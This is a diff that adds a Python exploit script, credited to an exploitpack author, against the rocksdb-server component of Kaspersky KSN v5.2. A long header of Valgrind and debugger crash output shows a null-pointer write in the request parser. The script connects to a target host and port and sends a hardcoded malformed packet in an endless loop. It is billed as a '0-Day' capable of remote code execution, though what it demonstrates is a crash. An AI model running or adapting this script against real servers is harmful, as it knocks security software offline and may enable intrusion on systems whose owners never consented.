@@ -1,0 +1,254 @@
+'''
+# Exploit Author: Juan Sacco <jsacco@exploitpack.com> - http://exploitpack.com
+#
+# Tested on: Kali i686 GNU/Linux
+# CVE: NotYet
+#
+# Exploit description:
+# Kaspersky KSN v5.2 is prone to a remote memory corruption because it
+fails to properly filter the input on the remote subscribers, this
+leads to heap segments overwrite
+# and it leads to remote code execution.
+#
+#
+# Program description:
+# Kaspersky KSN for Linux enables cloud-assisted, multi-layered
+security for servers and workstations running the Linux operating
+system. It delivers reliable protection with minimal impact on
+# performance.
+# Product homepage: http://kaspersky.com
+#
+# Example usage: python kaspersky.py 192.168.1.1 6349
+#
+# [!] Valgrind output:
+#
+# =3314== Invalid write of size 4
+# ==3314==    at 0x24FA74:
+RespObject::SetSimpleString(std::__cxx11::basic_string<char,
+std::char_traits<char>, std::allocator<char> > const&) (in
+/usr/local/ksn/bin/rocksdb-server)
+# ==3314==    by 0x241814: RequestParser::Parse(unsigned char*,
+unsigned long, std::function<void (RespObject const&)>) (in
+/usr/local/ksn/bin/rocksdb-server)
+# ==3314==    by 0x23B740:
+Session<boost::asio::basic_stream_socket<boost::asio::ip::tcp,
+boost::asio::stream_socket_service<boost::asio::ip::tcp> >
+>::HandleRead(boost::system::error_code const&, unsigned long) (in
+/usr/local/ksn/bin/rocksdb-server)
+# ==3314==    by 0x22FF56:
+boost::asio::detail::reactive_socket_recv_op<boost::asio::mutable_buffers_1,
+boost::_bi::bind_t<void, boost::_mfi::mf2<void,
+Session<boost::asio::basic_stream_socket<boost::asio::ip::tcp,
+boost::asio::stream_socket_service<boost::asio::ip::tcp> > >,
+boost::system::error_code const&, unsigned long>,
+boost::_bi::list3<boost::_bi::value<Session<boost::asio::basic_stream_socket<boost::asio::ip::tcp,
+boost::asio::stream_socket_service<boost::asio::ip::tcp> > >*>,
+boost::arg<1> (*)(), boost::arg<2> (*)()> >
+>::do_complete(boost::asio::detail::task_io_service*,
+boost::asio::detail::task_io_service_operation*,
+boost::system::error_code const&, unsigned long) (in
+/usr/local/ksn/bin/rocksdb-server)
+# ==3314==    by 0x23647C:
+boost::asio::detail::task_io_service::run(boost::system::error_code&)
+(in /usr/local/ksn/bin/rocksdb-server)
+# ==3314==    by 0x1E978A: main (in /usr/local/ksn/bin/rocksdb-server)
+# ==3314==  Address 0x0 is not stack'd, malloc'd or (recently) free'd
+# ==3314==
+# ==3314==
+# ==3314== Process terminating with default action of signal 11
+(SIGSEGV): dumping core
+# ==3314==  Access not within mapped region at address 0x0
+# ==3314==    at 0x24FA74:
+RespObject::SetSimpleString(std::__cxx11::basic_string<char,
+std::char_traits<char>, std::allocator<char> > const&) (in
+/usr/local/ksn/bin/rocksdb-server)
+# ==3314==    by 0x241814: RequestParser::Parse(unsigned char*,
+unsigned long, std::function<void (RespObject const&)>) (in
+/usr/local/ksn/bin/rocksdb-server)
+# ==3314==    by 0x23B740:
+Session<boost::asio::basic_stream_socket<boost::asio::ip::tcp,
+boost::asio::stream_socket_service<boost::asio::ip::tcp> >
+>::HandleRead(boost::system::error_code const&, unsigned long) (in
+/usr/local/ksn/bin/rocksdb-server)
+# ==3314==    by 0x22FF56:
+boost::asio::detail::reactive_socket_recv_op<boost::asio::mutable_buffers_1,
+boost::_bi::bind_t<void, boost::_mfi::mf2<void,
+Session<boost::asio::basic_stream_socket<boost::asio::ip::tcp,
+boost::asio::stream_socket_service<boost::asio::ip::tcp> > >,
+boost::system::error_code const&, unsigned long>,
+boost::_bi::list3<boost::_bi::value<Session<boost::asio::basic_stream_socket<boost::asio::ip::tcp,
+boost::asio::stream_socket_service<boost::asio::ip::tcp> > >*>,
+boost::arg<1> (*)(), boost::arg<2> (*)()> >
+>::do_complete(boost::asio::detail::task_io_service*,
+boost::asio::detail::task_io_service_operation*,
+boost::system::error_code const&, unsigned long) (in
+/usr/local/ksn/bin/rocksdb-server)
+# ==3314==    by 0x23647C:
+boost::asio::detail::task_io_service::run(boost::system::error_code&)
+(in /usr/local/ksn/bin/rocksdb-server)
+# ==3314==    by 0x1E978A: main (in /usr/local/ksn/bin/rocksdb-server)
+# ==3314==  If you believe this happened as a result of a stack
+# ==3314==  overflow in your program's main thread (unlikely but
+# ==3314==  possible), you can try to increase the size of the
+# ==3314==  main thread stack using the --main-stacksize= flag.
+# ==3314==  The main thread stack size used in this run was 8388608.
+# ==3314==
+# ==3314== HEAP SUMMARY:
+# ==3314==     in use at exit: 769,426 bytes in 7,522 blocks
+# ==3314==   total heap usage: 15,342 allocs, 7,820 frees, 1,354,534
+bytes allocated
+# ==3314==
+# ==3314== LEAK SUMMARY:
+# ==3314==    definitely lost: 8 bytes in 1 blocks
+# ==3314==    indirectly lost: 0 bytes in 0 blocks
+# ==3314==      possibly lost: 5,328 bytes in 9 blocks
+# ==3314==    still reachable: 764,090 bytes in 7,512 blocks
+# ==3314==                       of which reachable via heuristic:
+# ==3314==                         newarray           : 8,264 bytes in 4 blocks
+# ==3314==         suppressed: 0 bytes in 0 blocks
+#
+# [!] Debugger output:
+#
+# [----------------------------------registers-----------------------------------]
+# RAX: 0x7ffe127426f0 --> 0x7ffe12742800 --> 0x7f7ee28fb1c0 -->
+0x7f7ee1d4f090 --> 0x7f7ee1894760
+(<_ZN5boost4asio6detail15task_io_serviceD2Ev>:  push   r13)
+# RBX: 0x0
+# RCX: 0x7f7ee2913000 --> 0x0
+# RDX: 0xffffffffffdf6bf0
+# RSI: 0x7ffe127426e0 --> 0x7ffe127426f0 --> 0x7ffe12742800 -->
+0x7f7ee28fb1c0 --> 0x7f7ee1d4f090 --> 0x7f7ee1894760
+(<_ZN5boost4asio6detail15task_io_serviceD2Ev>:       push   r13)
+# RDI: 0x0
+# RBP: 0x7f7ee28f5338 --> 0x81
+# RSP: 0x7ffe127425c0 --> 0x7f7ee2924198 --> 0x7f7ee28f5320 --> 0x5
+# RIP: 0x7f7ee18b3a74
+(<_ZN10RespObject15SetSimpleStringERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE+4>:
+      mov    DWORD PTR [rdi],0x1)
+# R8 : 0x0
+# R9 : 0x7
+# R10: 0x2
+# R11: 0x7f7ee00276d0 --> 0xfffcdfc0fffcd800
+# R12: 0x29b
+# R13: 0x0
+# R14: 0x7ffe127426e0 --> 0x7ffe127426f0 --> 0x7ffe12742800 -->
+0x7f7ee28fb1c0 --> 0x7f7ee1d4f090 --> 0x7f7ee1894760
+(<_ZN5boost4asio6detail15task_io_serviceD2Ev>:       push   r13)
+# R15: 0x7f7ee2924562 --> 0x543ffb3c7ef1cd2b
+# EFLAGS: 0x10207 (CARRY PARITY adjust zero sign trap INTERRUPT
+direction overflow)
+# [-------------------------------------code-------------------------------------]
+#    0x7f7ee18b3a6e:      xchg   ax,ax
+#    0x7f7ee18b3a70
+<_ZN10RespObject15SetSimpleStringERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE>:
+   push   rbx
+#    0x7f7ee18b3a71
+<_ZN10RespObject15SetSimpleStringERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE+1>:
+ mov    rbx,rdi
+# => 0x7f7ee18b3a74
+<_ZN10RespObject15SetSimpleStringERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE+4>:
+ mov    DWORD PTR [rdi],0x1
+#    0x7f7ee18b3a7a
+<_ZN10RespObject15SetSimpleStringERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE+10>:
+lea    rdi,[rdi+0x10]
+#    0x7f7ee18b3a7e
+<_ZN10RespObject15SetSimpleStringERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE+14>:
+call   0x7f7ee184a8a0
+<_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE9_M_assignERKS4_@plt>
+#    0x7f7ee18b3a83
+<_ZN10RespObject15SetSimpleStringERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE+19>:
+mov    BYTE PTR [rbx+0x4],0x0
+#    0x7f7ee18b3a87
+<_ZN10RespObject15SetSimpleStringERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE+23>:
+pop    rbx
+# [------------------------------------stack-------------------------------------]
+# 0000| 0x7ffe127425c0 --> 0x7f7ee2924198 --> 0x7f7ee28f5320 --> 0x5
+# 0008| 0x7ffe127425c8 --> 0x7f7ee18a5815
+(<_ZN13RequestParser5ParseEPhmSt8functionIFvRK10RespObjectEE+3317>:
+ mov    rdi,QWORD PTR [rsp+0x110])
+# 0016| 0x7ffe127425d0 --> 0x7f7ee2901c08 --> 0x5a849d1562a512bd
+# 0024| 0x7ffe127425d8 --> 0x7f7ee29242c8 --> 0x10061030045
+# 0032| 0x7ffe127425e0 --> 0x361
+# 0040| 0x7ffe127425e8 --> 0x0
+# 0048| 0x7ffe127425f0 --> 0x7ffe127426e0 --> 0x7ffe127426f0 -->
+0x7ffe12742800 --> 0x7f7ee28fb1c0 --> 0x7f7ee1d4f090 (--> ...)
+# 0056| 0x7ffe127425f8 --> 0x7ffe127426a0 --> 0x0
+# [------------------------------------------------------------------------------]
+# Legend: code, data, rodata, value
+# Stopped reason: SIGSEGV
+# 0x00007f7ee18b3a74 in
+RespObject::SetSimpleString(std::__cxx11::basic_string<char,
+std::char_traits<char>, std::allocator<char> > const&) ()
+# gdb-peda$ where
+# #0  0x00007f7ee18b3a74 in
+RespObject::SetSimpleString(std::__cxx11::basic_string<char,
+std::char_traits<char>, std::allocator<char> > const&) ()
+# #1  0x00007f7ee18a5815 in RequestParser::Parse(unsigned char*,
+unsigned long, std::function<void (RespObject const&)>) ()
+# #2  0x00007f7ee189f741 in
+Session<boost::asio::basic_stream_socket<boost::asio::ip::tcp,
+boost::asio::stream_socket_service<boost::asio::ip::tcp> >
+>::HandleRead(boost::system::error_code const&, unsigned long
+'''
+
+import binascii
+import sys
+import socket
+import time
+
+def rocksDB(target,port):
+    try:
+        while 1:
+            # Open socket
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            # Set reuse ON
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            # Bind port
+            s.connect((target, port))
+            print("[" + time.strftime('%a %H:%M:%S') + "]" + " - " +
+"Connected to:"), target, port
+            print("[" + time.strftime('%a %H:%M:%S') + "]" + " - " +
+"Establishing connection.. ")
+            packet =
+binascii.unhexlify(b'4500036100010000400679947f0000017f000001001419100000000000000000500220009e1700005ce528736b32895950f96218411ca66c9b0842c995eacbfc3eacd8187d3aa8488e1cf1f18491606b9c400c42ec88e7399baa7c3b0bca43de853c74d2fbb2c08c9868ad9688b815d6e5a913937ff05217e18ff28d379fa6985204f7f529990a675d2fc70e1a7dbca8334e4faf30ea31cb33f0c1fabbfc92fbaf20d7e63cfe65ee95711a80a406c26b6e60335d74a02b42a454bc6bbcf5153cb20b77c9686b2fff994b224a3dc5fcbd12a562159d845a8b039abf971bb7c79fe74ca7055560c9c513377881b7a033eb797738fc119758f4c6ea1a960cab1299f5b1a6e99e0be889d8bdf05edc7ca6f14a48d35a5f747887e2330a5cc8b722257ecf32987ad1e24aa56c4685fdae028ca7689bdb66b3d951b8021a34a04114f4208c3f9a6d66bcb7cbeec80a716d69375a88202f3cac2562c9595095c61e693080edd5a3318084d974a2130d5cfe439903d6d5b9b3b553143831c6e01f286da4a2339c91cfce00fe17d7584153ab93e723ce2e859d7aaa9f9574af2dbb4ca4d9f8c8f39f4e89a790e5e4e74bbfd44a721594362f1c71cc48721014f451b837aff64624ea8fbc767c50ada655f23c87195b49b854c3e0d69f1585b663a02ad33cfdfd78c43e3531d6802b7271b7518ded3d93338084ca0e7982dc7c76d82c1b0fed91e5dc567262f46e3bd71b66f9d8283784d666a2be99e397a4abe9495168c880d7f371b87f44b38e61d836ccad8afc8c99518fa1240ab5a2a0685a9d450f4b44fefcc6b64ce8f6ec836922670b31ebf62ea5933e272a62ac8ff2c79d8f15a1220a37e5535ec0998aaf8af2f9d0a0f75e96fad8e8b1ae0e2fff70d831c501048644f700527d61d1f6cb177948e0ebea8d4a01fa9c7ca2c4b3472bcdf17e3cfb3f54fb791a43f114514b6821390d2c16e23ff9ffb0b0caa508b2952b0a497a24ce0d8ad05734111034a71d57a624855b95594b7f158903f03c02213c8de27644a2026de0c7477f1550f9f39450718ddf185eb9c5f9fc7b545c838970c4f7e87b69c570a873d8f64fe08ed23c7b8275f8bf54f080508bb244fbf3dc852968bd8a63a8787c8e496508c597ae9f617bfb096bebf94cbb736a6438163f61479816da9d88e2a3ea6b50a828d9c2c6f51f34e29f4fe588a41e5e3a53515d474a5a52b357')
+            # Log the packet in hexa and timestamp
+            fileLog = target + ".log"
+            logPacket = open("exploit.log", "w+")
+            logPacket.write("["+time.strftime('%a %H:%M:%S')+"]"+ " -
+Writing to socket: " + binascii.hexlify(bytes(packet))+"\n")
+            logPacket.close()
+
+            # Write bytecodes to socket
+            print("["+time.strftime('%a %H:%M:%S')+"]"+" - "+"Writing
+to socket: ")
+            s.send(bytes(packet))
+            # Packet sent:
+            print(bytes(packet))
+            try:
+                data = s.recv(4096)
+                print("[" + time.strftime('%a %H:%M:%S') + "]" + " -
+"+ "Data received: '{msg}'".format(msg=data))
+            except socket.error, e:
+                print '[!] Sorry, No data available'
+                continue
+        s.close()
+    except socket.error as error:
+        print error
+        print "Sorry, something went wrong!"
+
+def howtouse():
+    print "Usage: kaspersky.py hostname port"
+    print "[*] Mandatory arguments:"
+    print "[-] Specify a hostname / port"
+    sys.exit(-1)
+
+if __name__ == "__main__":
+    try:
+        # Set target
+        target = sys.argv[1]
+        port = int(sys.argv[2])
+
+        print "[*] Kaspersky KSN 0-Day by Juan Sacco <jsacco@exploitpack.com>"
+        rocksDB(target, port)
+    except IndexError:
+        howtouse()
